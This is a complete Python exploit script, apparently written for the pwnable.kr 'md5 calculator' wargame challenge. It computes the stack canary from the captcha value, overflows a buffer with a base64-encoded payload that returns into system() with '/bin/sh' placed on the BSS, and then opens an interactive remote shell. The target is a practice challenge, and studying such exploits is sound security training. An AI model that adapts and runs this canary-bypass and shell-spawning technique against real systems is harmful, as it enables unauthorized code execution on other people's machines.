from pwn import *


class MD5CalculatorExploit(object):
    SYSTEM_ADDRESS = 0x08048880
    SYSTEM_ARGUMENT = b"/bin/sh"
    ENCODED_PAYLOAD_ADDRESS = 0x0804B0E0
    DECODED_PAYLOAD_BUFFER_SIZE = 512

    def __init__(self) -> None:
        self.shell = remote('pwnable.kr', 9002)
        self.random_sum = int(subprocess.Popen("./calculate_random_sum", stdout=subprocess.PIPE).communicate()[0])
        self.exploit_payload = ""

    def calculate_stack_canary(self):
        print(self.shell.recv())
        captcha_line = self.shell.recv()
        print(captcha_line)
        captcha_sum = int(re.findall(r"-?\d+", str(captcha_line))[0])
        self.shell.sendline(str(captcha_sum))
        print(self.shell.recv())
        print(self.shell.recv())
        stack_canary = captcha_sum - self.random_sum
        print("Calculated stack canary:", hex(stack_canary))
        return stack_canary

    def craft_exploit_payload(self):
        stack_canary = self.calculate_stack_canary()

        # Decoded payload (responsible for stack overflow)

        self.exploit_payload = b"A" * self.DECODED_PAYLOAD_BUFFER_SIZE + p32(stack_canary) + b"A" * 12 + \
                               p32(self.SYSTEM_ADDRESS) + b"A" * 4
        # We will add more encoded payload after performing b64encode,
        # so we want to make sure that no base64 padding will be added
        required_padding = 3 - ((len(self.exploit_payload) + 4) % 3)
        length_after_padding = len(base64.b64encode(self.exploit_payload + b"A" * (4 + required_padding)))
        # Padding before "/bin/sh" so that a null terminator will come immediately after "/bin/sh" (and not "=")
        required_second_padding = 4 - ((length_after_padding + len(self.SYSTEM_ARGUMENT)) % 4)
        length_after_second_padding = length_after_padding + required_second_padding + len(self.SYSTEM_ARGUMENT)
        # Calculate the address of "/bin/sh" on the BSS and add it to the payload with the appropriate padding
        system_argument_address = self.ENCODED_PAYLOAD_ADDRESS + length_after_second_padding - len(self.SYSTEM_ARGUMENT)
        self.exploit_payload += p32(system_argument_address) + b"A" * required_padding

        # Encoded payload ("/bin/sh" resides on BSS and not on stack)

        self.exploit_payload = base64.b64encode(self.exploit_payload)
        self.exploit_payload += b"A" * required_second_padding
        self.exploit_payload += self.SYSTEM_ARGUMENT

    def run(self):
        self.craft_exploit_payload()
        print("payload:")
        print(self.exploit_payload)
        self.shell.sendline(self.exploit_payload)
        print(self.shell.recv())
        self.shell.interactive()


if __name__ == '__main__':
    MD5CalculatorExploit().run()
